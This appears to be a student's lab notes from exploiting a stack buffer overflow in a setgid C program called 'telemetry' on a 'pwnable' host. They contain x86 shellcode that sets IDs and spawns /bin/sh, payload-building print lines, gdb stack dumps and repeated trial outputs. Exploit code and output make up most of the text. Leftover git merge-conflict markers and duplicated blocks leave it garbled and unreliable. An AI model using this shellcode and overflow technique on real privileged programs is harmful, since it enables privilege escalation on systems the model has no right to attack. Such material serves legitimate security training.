#!/usr/bin/env python2

#Code to inject exploit (given shellcode):

shellcode = \
"\x6a\x32\x58\xcd\x80\x89\xc3\x89\xc1\x6a" + \
"\x47\x58\xcd\x80\x31\xc0\x50\x68\x2f\x2f" + \
"\x73\x68\x68\x2f\x62\x69\x6e\x54\x5b\x50" + \
"\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"
print("\xff" + "A" * 128 + "\x2c\xfb\xff\xbf" + shellcode) #[changed trials, see below]

<<<<<<< HEAD:spica.c
#Telemetry.c file
#!/usr/bin/env python2

#Code to inject exploit (given shellcode):

shellcode = \
"\x6a\x32\x58\xcd\x80\x89\xc3\x89\xc1\x6a" + \
"\x47\x58\xcd\x80\x31\xc0\x50\x68\x2f\x2f" + \
"\x73\x68\x68\x2f\x62\x69\x6e\x54\x5b\x50" + \
"\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"
print("\xff" + "A" * 128 + "\x2c\xfb\xff\xbf" + shellcode) #[changed trials, see below]

////////////////////////////////
=======

>>>>>>> 0a2c47bd2186e49888a30e2ecda0cae4aa4381ca:spica.py
#telemetry.c
pwnable:~$ cat telemetry.c
#include <stdint.h>
#include <stdio.h>
#include <string.h>

void display(const char *path)
{
  char msg[128];
  int8_t size;
  memset(msg, 0, 128);

  FILE *file = fopen(path, "r");
  if (!file) {
    perror("fopen");
    return;
  }
  size_t bytes_read = fread(&size, 1, 1, file);
  if (bytes_read == 0 || size > 128)
    return;
  bytes_read = fread(msg, 1, size, file);

  puts(msg);
}


int main(int argc, char *argv[])
{
  if (argc != 2)
    return 1;

  display(argv[1]);
  return 0;
}
<<<<<<< HEAD:spica.c
/////////////////////////////////
=======

>>>>>>> 0a2c47bd2186e49888a30e2ecda0cae4aa4381ca:spica.py


/*
Stack Diagram
[4] RIP of main                                BUF ON ATTACK
[4] SFP of main                                BUF ON ATTACK
[n] compiler padding unknown bytes n
*now in display*
[4] RIP orbit(@ , value @ ) REASSIGN ON ATTACK
[4] SFP orbit(@ )                    GARBAGE ON ATTACK
[m] compiler padding unknown bytes m
[8] char buf (buffer)                          GARBAGE ON ATTACK
*breakpoint* won't actually go into gets func. from here


*/

#Stack Details
#------------------------------------------------------------------------
#pwnable:~$ ls -al
#-rwxr-xr-x    1 spica    spica         1051 Sep 15  2021 egg
#-rwxr-x---    1 root     spica           57 Sep  9 19:20 exploit
#-rwxr-sr-x    1 root     polaris      18328 Sep  9 19:20 telemetry





0x1338 <display+150>    call   0x1050 <fread@plt>call to fread formatted: the first byte of the file specifies its length, followed by the actual file.│
│   0x133d <display+155>    add    $0x10,%esp                                                                         │
│   0x1340 <display+158>    mov    %eax,-0x10(%ebp)                                                                   │
│   0x1343 <display+161>    sub    $0xc,%esp                                                                          │
│   0x1346 <display+164>    lea    -0x90(%ebp),%eax                                                                   │
│   0x134c <display+170>    push   %eax
#------------------------------------------------------------------------
#bytes_read = fread(msg, 1, size, file);
#---------------------------DISPLAY[19]----------------------------------
#(gdb)b 19
#Breakpoint 1, display (path=0xbffffcdc "navigation") at telemetry.c:19
#(gdb) i f
#Stack level 0, frame at 0xbffffb30:
# eip = 0x401321 in display (telemetry.c:19); saved eip = 0x401397
# called by frame at 0xbffffb60
# source language c.
# Arglist at 0xbffffb28, args: path=0xbffffcdc "navigation"
# Locals at 0xbffffb28, Previous frame's sp is 0xbffffb30
# Saved registers:
#  ebx at 0xbffffb24, ebp at 0xbffffb28, eip at 0xbffffb2c
#
#  VALUE OF EIP/RIP = @ 0x401397
#  LOC OF EIP/RIP = @ 0xbffffb2c
#  LOC OF EBP/SFP = @ 0xbffffb28
#  DISTANCE FROM RIP-SFP == 4
#
#         -----------(gdb) x/32x 0xbffffb30-----------(128 bytes)
#         0xbffffb30:     0xbffffcdc      0x00000000      0x00000000      0x00401373
#         0xbffffb40:     0x00000000      0xbffffb60      0xbffffbe0      0xb7f82ef2
#         0xbffffb50:     0xbffffbd4      0x00000002      0x00000000      0xb7f82ef2
#         0xbffffb60:     0x00000002      0xbffffbd4      0xbffffbe0      0xb7fff090
#         0xbffffb70:     0x00000011      0x00000000      0xb7f82ed0      0x00403fbc
#         0xbffffb80:     0xb7ffea20      0xb7ffec40      0x00000000      0x004010fd
#         0xbffffb90:     0x0040135d      0x00000002      0xbffffbd4      0x00401000
#         0xbffffba0:     0x004013f1      0x00000000      0xb7fc675b      0x00000000
#         0xbffffba0:     0x004013f1      0x00000000      0xb7fc675b      0x00000000
#
#       -----------(gdb) x/32x fread-----------
#       0xb7fb1b5e <fread_unlocked>:    0xfc9cc3e8      0xb42505ff      0x57550004      0xec835356
#       0xb7fb1b6e <fread_unlocked+16>: 0x246c8b1c      0x6caf0f34      0x44893824      0x7c830824
#       0xb7fb1b7e <fread_unlocked+32>: 0x8b003424      0x753c2474      0x2444c708      0x00000038
#       0xb7fb1b8e <fread_unlocked+48>: 0x4c468b00      0xc085ff31      0xec830e78      0xfbe8560c
#       0xb7fb1b9e <fread_unlocked+64>: 0x83ffffe6      0xc78910c4      0x8948568b      0xff428deb
#       0xb7fb1bae <fread_unlocked+80>: 0x568bd009      0x48468908      0x3904468b      0x295774d0
#       0xb7fb1bbe <fread_unlocked+96>: 0x76ea39c2      0x51ea8902      0x24548952      0x74ff5014
#       0xb7fb1bce <fread_unlocked+112>:0x5c8b3c24      0xf3e81824      0x8b00006d      0x891c2454
#       -----------(gdb) x/32x msg----------- (8*4*4 = 128 bytes of msg)
#       0xbffffa98:     0x00000000      0x00000000      0x00000000      0x00000000
#       0xbffffaa8:     0x00000000      0x00000000      0x00000000      0x00000000
#       0xbffffab8:     0x00000000      0x00000000      0x00000000      0x00000000
#       0xbffffac8:     0x00000000      0x00000000      0x00000000      0x00000000
#       0xbffffad8:     0x00000000      0x00000000      0x00000000      0x00000000
#       0xbffffae8:     0x00000000      0x00000000      0x00000000      0x00000000
#       0xbffffaf8:     0x00000000      0x00000000      0x00000000      0x00000000
#       0xbffffb08:     0x00000000      0x00000000      0x00000000      0x00000000 //#end@b08, so RIP@0xbffffb2c not far, (2c-08 = 4=24 bytes)
#       -----------(gdb) x/32x size----------- (none passed, memory @ 0xffffffff in 'file' with byte size 4*3*4 = 48)
#       0xffffffff:     Cannot access memory at address 0xffffffff
#       -----------(gdb) x/32x file-----------(8*4*4 = 128 bytes of file in total)[func asserts file !> 128]
#       0xb7f61020:     0x00000008      0xb7f610b1      0xb7f6115a      0xb7fb03cf
  #       0xb7f61030:     0x00000000      0x00000000      0x00000000      0x00000000
#       0xb7f61040:     0xb7fb0494      0xb7fb054b      0xb7fb053b      0xb7f610b0
#       0xb7f61050:     0x00000400      0x00000000      0x00000000      0x00000003
#       0xb7f61060:     0x00000000      0x00000000      0xffffffff      0xffffffff
#       0xb7f61070:     0xffffffff      0x00000000      0x00000000      0x00000000
#       0xb7f61080:     0x00000000      0x00000000      0x00000000      0x00000000
#       0xb7f61090:     0x00000000      0x00000000      0x00000000      0x00000000
#
#START:
#(16 bytes of '0x00000000' @ 0xbffffb28 )>
#(8 bytes of '0x00000000' @0xb7f61050 )>
#(4 bytes of 0x00000003 @0xb7f61050)>
#(another 8 bytes of '0x00000000' @0xb7f61060)>
#(12 bytes of bytes of '0xffffffff')>
#(44 bytes of '0x00000000')
#END
#SO... msg located at 0xbffffa98, RIP @ 0xbffffb2c
# size of input fread = RIP - loc of msg = 0xbffffb2c - 0xbffffa98 =
#------------------------------------------------------------------------
#[display 19] bytes_read = fread(msg, 1, size, file);
#fread(void *ptr, size_t size, size_t nmemb, FILE *stream)
#ptr − This is the pointer to a block of memory with a minimum size of size*nmemb bytes.
#size − This is the size in bytes of each element to be read.
#ptr − This is the pointer to a block of memory with a minimum size of size*nmemb bytes.
#size − This is the size in bytes of each element to be read.
#nmemb − This is the number of elements, each one with a size of size bytes.
#stream − This is the pointer to a FILE object that specifies an input stream.
#------------------------------------------------------------------------
#eip = "x2cxfbxffxbf"
#size = "xff" #(2nd 4 bytes)
#msg_filler = "A"*128
#one_value = size #for safety
##terminal
#print(size + one_value + msg_filler + eip + shellcode)
#>>>> yeilds
#pwnable:~$ ./exploit
#?AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>
#Segmentation fault
#(len("A") ==127
#print(size + msg_filler + eip + shellcode)
#>>>> yeilds
#pwnable:~$ ./exploit
#AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>
#Segmentation fault
#(len("A") == 128)
#_______________________________________________________________________

when running print("\xff" * 1 + "A" * 20  + "\x2c\xfb\xff\xbf" + shellcode)
i get
pwnable:~$ ./exploit
,???j2X̀?É?jGX̀1?Ph//shh/binT[PS??1Ұ
                                  ̀

pwnable:~$
so theres a weird character   ̀ in second line and I don't know what to make of the occurrence of two empty lines.
i know the len of " ,???j2X̀?É?jGX̀1?Ph// " right before ssh is = 20, the same as before when running with A, but whenever I
try running "A" * 20 and that
doesn't work either. I have also tried subtracting 20 from the RIP address (BFFFFB0C) and got


print(size*1 + eip + size*0 + "A"*0 + shellcode)
eip = "\x0c\xfb\xff\xbf"
gives....
pwnable:~$ ./exploit

???j2X̀?É?jGX̀1?Ph//shh/binT[PS??1Ұ
                                 ̀

pwnable:~$
1 empty line + len 21 str + "ssh"

moving eip up by 20 bffffb0c + 20 =  bffffb2c, same as RIP address


print(size*1 + eip + size*0 + "A"*21 + shellcode)
pwnable:~$ ./exploit

???AAAAAAAAAAAAAAAAAAAAAj2X̀?É?jGX̀1?Ph//shh/binT[PS??1Ұ
                                                      ̀

pwnable:~$











#------------------------------------------------------------------------
#pwnable:~$ ls -al
#-rwxr-xr-x    1 spica    spica         1051 Sep 15  2021 egg
#-rwxr-x---    1 root     spica           57 Sep  9 19:20 exploit
#-rwxr-sr-x    1 root     polaris      18328 Sep  9 19:20 telemetry
#------------------------------------------------------------------------
#bytes_read = fread(msg, 1, size, file);
#---------------------------DISPLAY[19]----------------------------------
#(gdb)b 19
#Breakpoint 1, display (path=0xbffffcdc "navigation") at telemetry.c:19
#(gdb) i f
#Stack level 0, frame at 0xbffffb30:
# eip = 0x401321 in display (telemetry.c:19); saved eip = 0x401397
# called by frame at 0xbffffb60
# source language c.
# Arglist at 0xbffffb28, args: path=0xbffffcdc "navigation"
# Locals at 0xbffffb28, Previous frame's sp is 0xbffffb30
# Saved registers:
#  ebx at 0xbffffb24, ebp at 0xbffffb28, eip at 0xbffffb2c
#
#  VALUE OF EIP/RIP = @ 0x401397
#  LOC OF EIP/RIP = @ 0xbffffb2c
#  LOC OF EBP/SFP = @ 0xbffffb28
#  DISTANCE FROM RIP-SFP == 4
#
#         -----------(gdb) x/32x 0xbffffb30-----------(128 bytes)
#         0xbffffb30:     0xbffffcdc      0x00000000      0x00000000      0x00401373
#         0xbffffb40:     0x00000000      0xbffffb60      0xbffffbe0      0xb7f82ef2
#         0xbffffb50:     0xbffffbd4      0x00000002      0x00000000      0xb7f82ef2
#         0xbffffb60:     0x00000002      0xbffffbd4      0xbffffbe0      0xb7fff090
#         0xbffffb70:     0x00000011      0x00000000      0xb7f82ed0      0x00403fbc
#         0xbffffb80:     0xb7ffea20      0xb7ffec40      0x00000000      0x004010fd
#         0xbffffb90:     0x0040135d      0x00000002      0xbffffbd4      0x00401000
#         0xbffffba0:     0x004013f1      0x00000000      0xb7fc675b      0x00000000
#         0xbffffba0:     0x004013f1      0x00000000      0xb7fc675b      0x00000000
#
#       -----------(gdb) x/32x fread-----------
#       0xb7fb1b5e <fread_unlocked>:    0xfc9cc3e8      0xb42505ff      0x57550004      0xec835356
#       0xb7fb1b6e <fread_unlocked+16>: 0x246c8b1c      0x6caf0f34      0x44893824      0x7c830824
#       0xb7fb1b7e <fread_unlocked+32>: 0x8b003424      0x753c2474      0x2444c708      0x00000038
#       0xb7fb1b8e <fread_unlocked+48>: 0x4c468b00      0xc085ff31      0xec830e78      0xfbe8560c
#       0xb7fb1b9e <fread_unlocked+64>: 0x83ffffe6      0xc78910c4      0x8948568b      0xff428deb
#       0xb7fb1bae <fread_unlocked+80>: 0x568bd009      0x48468908      0x3904468b      0x295774d0
#       0xb7fb1bbe <fread_unlocked+96>: 0x76ea39c2      0x51ea8902      0x24548952      0x74ff5014
#       0xb7fb1bce <fread_unlocked+112>:0x5c8b3c24      0xf3e81824      0x8b00006d      0x891c2454
#       -----------(gdb) x/32x msg----------- (8*4*4 = 128 bytes of msg)
#       0xbffffa98:     0x00000000      0x00000000      0x00000000      0x00000000
#       0xbffffaa8:     0x00000000      0x00000000      0x00000000      0x00000000
#       0xbffffab8:     0x00000000      0x00000000      0x00000000      0x00000000
#       0xbffffac8:     0x00000000      0x00000000      0x00000000      0x00000000
#       0xbffffad8:     0x00000000      0x00000000      0x00000000      0x00000000
#       0xbffffae8:     0x00000000      0x00000000      0x00000000      0x00000000
#       0xbffffaf8:     0x00000000      0x00000000      0x00000000      0x00000000
#       0xbffffb08:     0x00000000      0x00000000      0x00000000      0x00000000 //#end@b08, so RIP@0xbffffb2c not far, (2c-08 = 4=24 bytes)
#       -----------(gdb) x/32x size----------- (none passed, memory @ 0xffffffff in 'file' with byte size 4*3*4 = 48)
#       0xffffffff:     Cannot access memory at address 0xffffffff
#       -----------(gdb) x/32x file-----------(8*4*4 = 128 bytes of file in total)[func asserts file !> 128]
#       0xb7f61020:     0x00000008      0xb7f610b1      0xb7f6115a      0xb7fb03cf
  #       0xb7f61030:     0x00000000      0x00000000      0x00000000      0x00000000
#       0xb7f61040:     0xb7fb0494      0xb7fb054b      0xb7fb053b      0xb7f610b0
#       0xb7f61050:     0x00000400      0x00000000      0x00000000      0x00000003
#       0xb7f61060:     0x00000000      0x00000000      0xffffffff      0xffffffff
#       0xb7f61070:     0xffffffff      0x00000000      0x00000000      0x00000000
#       0xb7f61080:     0x00000000      0x00000000      0x00000000      0x00000000
#       0xb7f61090:     0x00000000      0x00000000      0x00000000      0x00000000
#
#START:
#(16 bytes of '0x00000000' @ 0xbffffb28 )>
#(8 bytes of '0x00000000' @0xb7f61050 )>
#(4 bytes of 0x00000003 @0xb7f61050)>
#(another 8 bytes of '0x00000000' @0xb7f61060)>
#(12 bytes of bytes of '0xffffffff')>
#(44 bytes of '0x00000000')
#END
#SO... msg located at 0xbffffa98, RIP @ 0xbffffb2c
# size of input fread = RIP - loc of msg = 0xbffffb2c - 0xbffffa98 =
#------------------------------------------------------------------------
#[display 19] bytes_read = fread(msg, 1, size, file);
#fread(void *ptr, size_t size, size_t nmemb, FILE *stream)
#ptr − This is the pointer to a block of memory with a minimum size of size*nmemb bytes.
#size − This is the size in bytes of each element to be read.
#ptr − This is the pointer to a block of memory with a minimum size of size*nmemb bytes.
#size − This is the size in bytes of each element to be read.
#nmemb − This is the number of elements, each one with a size of size bytes.
#stream − This is the pointer to a FILE object that specifies an input stream.
#_______________________________________________________________________
#note: print(shellcode) gives "j2X̀?É?jGX̀1?Ph//shh/binT[PS??1Ұ..."
eip = 2c
eip = "\x2c\xfb\xff\xbf"
size = "\xff
shellcode = (given))
print(size + eip + "A"*1 + shellcode)
gives...
pwnable:~$ ./exploit
,???Aj2X̀?É?jGX̀1?Ph//shh/binT[PS??1Ұ
                                   ̀
pwnable:~$

#_______________________________________________________________________

eip = 4c
eip = "\x4c\xfb\xff\xbf"
size = "\xff
shellcode = (given))
print(size + eip + "A"*1 + shellcode)
gives...
pwnable:~$ ./exploit
L???Aj2X̀?É?jGX̀1?Ph//shh/binT[PS??1Ұ
                                   ̀

pwnable:~$
#_______________________________________________________________________
eip = 30
eip = "\x30\xfb\xff\xbf"
size = "\xff
shellcode = (given))
print(size + eip + "A"*1 + shellcode)
gives...
pwnable:~$ ./exploit
0???Aj2X̀?É?jGX̀1?Ph//shh/binT[PS??1Ұ
                                   ̀

pwnable:~$
#_______________________________________________________________________
eip = 34
eip = "\x34\xfb\xff\xbf"
size = "\xff
shellcode = (given))
print(size + eip + "A"*1 + shellcode)
gives...
pwnable:~$ ./exploit
4???Aj2X̀?É?jGX̀1?Ph//shh/binT[PS??1Ұ
                                   ̀

pwnable:~$
